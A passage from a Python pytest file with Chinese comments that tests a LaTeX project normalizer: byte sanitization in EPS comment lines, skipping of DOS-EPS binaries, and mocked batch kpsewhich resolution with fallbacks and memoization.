    r"""``.epsi`` 归 PS 臂：注释行坏字节净化、数据行字节即语义——不再整件转码。

    注释行形态取 corpus cond-mat/9901072 ``fig2.epsf`` 实件
    （``%%Copyright \xa9 1988-91`` latin-1）；catch-all 旧道会把数据行
    ``\xe9`` 一并改写腐件，本测试钉死新分派。
    """
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: 0 0 10 10\n"
        b"%%Copyright \xa9 1988-91 Deneba Systems\n"
        b"%%EndComments\n"
        b"(caf\xe9) show\n"
        b"%%EOF\n"
    )
    epsi = tmp_path / "fig.epsi"
    epsi.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.epsi" in stats["sanitized_ps_comments"]
    assert "fig.epsi" not in stats.get("transcoded_data", [])
    new = epsi.read_bytes()
    assert b"%%Copyright \xc2\xa9 1988-91" in new
    assert b"(caf\xe9) show" in new  # 数据行逐字节保留


def test_epsf_mps_route_to_ps_arm(tmp_path: Path) -> None:
    """``.epsf``/``.mps`` 同族——注释行坏字节净化记 ``sanitized_ps_comments``。"""
    for name in ("a.epsf", "b.mps"):
        (tmp_path / name).write_bytes(
            b"%!PS-Adobe-3.0\n%%For: caf\xe9\n%%EndComments\nshowpage\n"
        )
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["sanitized_ps_comments"] == ["a.epsf", "b.mps"]
    for name in ("a.epsf", "b.mps"):
        (tmp_path / name).read_bytes().decode("utf-8")


def test_dos_epsi_binary_skipped_with_ledger(tmp_path: Path) -> None:
    r"""DOS-EPS 二进制头件整件跳过 + ``dos_eps_skipped`` 台账（残余警告降 notes）。

    fixture 刻意不含 NUL——NUL 闸管不到它，只有魔数闸兜住；旧 catch-all
    道会整件 latin-1→UTF-8 改写，把头内绝对偏移全部改腐。
    """
    blob = b"\xc5\xd0\xd3\xc6" + bytes(range(1, 256))  # DOS 魔数 + 无 NUL 二进负载
    for name in ("prev.epsi", "prev.eps"):
        (tmp_path / name).write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["dos_eps_skipped"] == ["prev.eps", "prev.epsi"]
    for name in ("prev.epsi", "prev.eps"):
        assert (tmp_path / name).read_bytes() == blob
        assert name not in stats.get("transcoded_data", [])
        assert name not in stats.get("encodings", {})


# ---------------------------------------------------------------- kpse 批量解析
class _KpseProc:
    """``kpsewhich`` 批量输出模拟：逐 argv 位次行，miss=空行、末尾 miss 截断。

    returncode = miss 计数（kpathsea 6.4.2 实证）——批量路径不按 rc 判败。
    """

    def __init__(self, mapping: dict[str, str | None], argv: list[str]) -> None:
        names = argv[argv.index("--") + 1 :]
        self.returncode = sum(mapping.get(n) is None for n in names)
        lines = [mapping.get(n) or "" for n in names]
        while lines and not lines[-1]:
            lines.pop()
        self.stdout = "\n".join(lines) + ("\n" if lines else "")


def _kpse_run_factory(mapping: dict[str, str | None], calls: list[list[str]]) -> object:
    def _run(argv: list[str], **_kw: object) -> _KpseProc:
        calls.append(list(argv))
        return _KpseProc(mapping, argv)

    return _run


def _pin_kpse_which(monkeypatch: pytest.MonkeyPatch) -> None:
    """kpsewhich 在位钉——``_kpse_resolve_many`` 批量解析臂的进入前提。"""
    monkeypatch.setattr(shadow.shutil, "which", lambda *_a: "/bin/kpsewhich")


def _pin_kpse(
    monkeypatch: pytest.MonkeyPatch,
    mapping: dict[str, Path | None] | None = None,
    *,
    default: Path | None = None,
) -> None:
    """钉 ``_kpse_resolve_many``：请求名按 ``mapping`` 命中，缺席名落 ``default``。"""
    _pin_kpse_which(monkeypatch)
    lut = mapping or {}
    monkeypatch.setattr(
        shadow,
        "_kpse_resolve_many",
        lambda filenames, *_a: {f: lut.get(f, default) for f in filenames},
    )


def test_kpse_resolve_many_one_subprocess(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """N 名一次子进程：命中→Path、中部 miss（空行）与末尾 miss（截断）→ None。"""
    calls: list[list[str]] = []
    monkeypatch.setattr(
        shadow.subprocess,
        "run",
        _kpse_run_factory(
            {
                "article.cls": "/texmf/article.cls",
                "algo.sty": "/texmf/algo.sty",
                "ghost.sty": None,
                "ghost2.cls": None,
            },
            calls,
        ),
    )
    out = shadow._kpse_resolve_many(  # noqa: SLF001 — 钉的就是内部批量映射
        ["article.cls", "ghost.sty", "algo.sty", "ghost2.cls"],
        "xelatex",
        tmp_path,
        "/bin/kpsewhich",
    )
    assert calls == [
        [
            "/bin/kpsewhich",
            "-progname",
            "xelatex",
            "--",
            "article.cls",
            "ghost.sty",
            "algo.sty",
            "ghost2.cls",
        ]
    ]
    assert out == {
        "article.cls": Path("/texmf/article.cls"),
        "ghost.sty": None,
        "algo.sty": Path("/texmf/algo.sty"),
        "ghost2.cls": None,
    }


def test_kpse_resolve_many_basename_mismatch_resingles(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """命中行 basename 与请求名不符 → 该名回落 ``_kpse_resolve`` 单名复核。"""
    calls: list[list[str]] = []
    monkeypatch.setattr(
        shadow.subprocess,
        "run",
        _kpse_run_factory({"foo.sty": "/texmf/WRONG.sty"}, calls),
    )
    singles: list[str] = []
    monkeypatch.setattr(
        shadow,
        "_kpse_resolve",
        lambda f, *_a: singles.append(f) or Path("/real/foo.sty"),
    )
    out = shadow._kpse_resolve_many(  # noqa: SLF001
        ["foo.sty"], "xelatex", tmp_path, "/k"
    )
    assert singles == ["foo.sty"]
    assert out == {"foo.sty": Path("/real/foo.sty")}


def test_kpse_resolve_many_subprocess_failure_falls_back(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """子进程起不来（缺席/超时/NUL 名）→ 全量回落单名，逐名语义不破。"""

    def _boom(*_a: object, **_k: object) -> None:
        raise FileNotFoundError

    monkeypatch.setattr(shadow.subprocess, "run", _boom)
    singles: list[str] = []
    monkeypatch.setattr(
        shadow,
        "_kpse_resolve",
        lambda f, *_a: singles.append(f) or None,
    )
    out = shadow._kpse_resolve_many(  # noqa: SLF001
        ["a.sty", "b.cls"], "xelatex", tmp_path, "/k"
    )
    assert singles == ["a.sty", "b.cls"]
    assert out == {"a.sty": None, "b.cls": None}


def test_kpse_resolve_many_line_overflow_falls_back(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """输出行数 > 请求数（位次模型崩坏/版本漂移）→ 全量单名复核。"""

    class _WeirdProc:
        returncode = 0
        stdout = "/x/a.sty\n/x/b.sty\n/extra\n"

    monkeypatch.setattr(shadow.subprocess, "run", lambda *_a, **_k: _WeirdProc())
    singles: list[str] = []
    monkeypatch.setattr(
        shadow,
        "_kpse_resolve",
        lambda f, *_a: singles.append(f) or Path("/real", f),
    )
    out = shadow._kpse_resolve_many(  # noqa: SLF001
        ["a.sty", "b.sty"], "xelatex", tmp_path, "/k"
    )
    assert singles == ["a.sty", "b.sty"]
    assert out == {"a.sty": Path("/real/a.sty"), "b.sty": Path("/real/b.sty")}


def test_shadow_round_resolves_in_one_kpsewhich_call(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """一轮 fresh 名单 = 一次 kpsewhich 子进程（B14 fix#4:88 次 → 每轮 1 次）。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{alpha,beta,gamma}\n"
        "\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    calls: list[list[str]] = []
    _pin_kpse_which(monkeypatch)
    monkeypatch.setattr(
        shadow.subprocess,
        "run",
        _kpse_run_factory({}, calls),  # 全 miss——不遮蔽，只数调用
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    kpse_calls = [c for c in calls if "kpsewhich" in c[0]]
    assert len(kpse_calls) == 1
    argv_names = set(kpse_calls[0][kpse_calls[0].index("--") + 1 :])
    # 注入兼容块自带的 xkeyval/ifpdf/fontspec 引用同批进 argv——只钉作者名在位
    assert {"article.cls", "alpha.sty", "beta.sty", "gamma.sty"} <= argv_names


def test_normalize_project_memoizes_mask_and_decode(tmp_path: Path) -> None:
    """同份字节/文本被多 pass 复扫 → 内容键 memo 命中（B14 画像 fix#5）。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    for name in ("a.sty", "b.sty"):
        (tmp_path / name).write_text("% pkg\n\\ProvidesPackage{x}\n")
    textutil._mask_tex_memo.cache_clear()  # noqa: SLF001 — 钉管线级命中
    textutil._decode_tex_with_memo.cache_clear()  # noqa: SLF001
    normalize_project(tmp_path, "xelatex", "main.tex")
    assert textutil._mask_tex_memo.cache_info().hits > 0  # noqa: SLF001
    assert textutil._decode_tex_with_memo.cache_info().hits > 0  # noqa: SLF001
